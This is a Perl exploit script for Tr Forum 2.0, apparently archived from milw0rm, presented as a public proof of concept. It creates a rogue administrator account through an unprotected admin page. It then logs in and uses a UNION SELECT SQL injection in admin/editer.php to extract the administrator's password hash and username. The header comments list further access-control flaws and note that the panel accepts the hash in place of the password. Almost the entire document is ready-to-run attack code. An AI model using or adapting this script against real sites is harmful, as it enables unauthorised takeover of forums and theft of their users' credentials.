<html><head><title>Tr Forum 2.0 SQL Injection / Bypass Security Restriction Exploit</title></head><pre>#!/usr/bin/perl
#
# Affected.scr..: Tr Forum V2.0
# Poc.ID........: 10060903
# Type..........: SQL Injection, Bypass Security Restriction
# Risk.level....: Medium
# Vendor.Status.: Unpatched
# Src.download..: comscripts.com/scripts/php.tr-forum.1579.html
# Poc.link......: acid-root.new.fr/poc/10060903.txt
# Credits.......: DarkFig
#
# /membres/modif_profil.php =&gt; Profil modification (you can choose the id of the member)
# /membres/change_mdp.php   =&gt; Password modification ( same... )
# /admin/insert_admin.php   =&gt; Second admin (only del post)
# /admin/editer.php         =&gt; SQL Injection without quote
#
# You don't need to crack passwd hashes (for the admin panel)...
# Go to the admin panel (/admin/), enter the username and the hash (not the passwd)... bad security =(
# This exploit is FOR EDUCATIONAL PURPOSE ONLY x 999
#
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common &quot;POST&quot;;
use HTTP::Response;
use Getopt::Long;
use strict;

print STDOUT &quot;\n+&quot;, '-' x 53, &quot;+\n&quot;;
print STDOUT &quot;|    Tr Forum V2.0 Admin MD5 Passwd Hash Disclosure   |\n&quot;;
print STDOUT '+', '-' x 53, &quot;+\n&quot;;

my($host,$path,$proxh,$proxu,$proxp);
my $opt = GetOptions(
   'host=s'   =&gt;  \$host,
   'path=s'   =&gt;  \$path,
   'proxh=s'  =&gt;  \$proxh,
   'proxu=s'  =&gt;  \$proxu,
   'proxp=s'  =&gt;  \$proxp);

if(!$host) {
    print STDOUT &quot;| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n&quot;;
    print STDOUT &quot;| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n&quot;;
    print STDOUT '+', '-' x 53, &quot;+\n&quot;;
    exit(0);
}

if($host  !~ /http/) {$host = 'http://'.$host;}
if($proxh !~ /http/ &amp;&amp; $proxh != '') {$proxh = 'http://'.$proxh.'/';}
if(!$path) {$path = '/';}

print STDOUT &quot; [!]Host..: $host\n&quot;;
print STDOUT &quot; [!]Path..: $path\n&quot;;
print STDOUT &quot; [~]Admin user...\n&quot;;
sleep(1);

my $cc = HTTP::Cookies-&gt;new();
my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;cookie_jar($cc);
   $ua-&gt;agent('0xzilla');
   $ua-&gt;timeout(30);
   $ua-&gt;proxy(['http'] =&gt; $proxh) if $proxh;

my $re = POST $host.$path.'/admin/insert_admin.php',[
         'login'    =&gt; 'AcidSploitWasHere',
         'password' =&gt; 'psychopasswd',
         'mail'     =&gt; 'nospam@bot.com',
         ];
   $re-&gt;proxy_authorization_basic($proxu, $proxp) if $proxp;
   $ua-&gt;request($re);

print STDOUT &quot; [+]User..: AcidSploitWasHere\n&quot;;
print STDOUT &quot; [+]Pass..: psychopasswd\n&quot;;
print STDOUT &quot; [!]Rights: 2 (medium)\n&quot;;
print STDOUT &quot; [~]Collecting admin's hash/username...\n&quot;;
sleep(1);

my $re = POST $host.$path.'index.php',[
         'login'   =&gt; 'AcidSploitWasHere',
         'pwd'     =&gt; 'psychopasswd',
        ];
   $ua-&gt;request($re);

my $re = $ua-&gt;get($host.$path.'admin/editer.php?id2=-1 UNION SELECT pass,pseudo,0 FROM tr_user_forum');

if($re-&gt;content =~ /&quot;&gt;([a-z0-9]{32})&lt;\/font&gt;/) {
                print STDOUT &quot;\n &quot;.$1.'::';}

if($re-&gt;content =~ /;&quot;&gt;(.*?)&lt;\/textarea&gt;/) {
                print STDOUT $1.' (root)';}

print STDOUT &quot;\n+&quot;, '-' x 53, &quot;+\n&quot;;
exit(0);

# milw0rm.com [2006-09-04]</pre></html>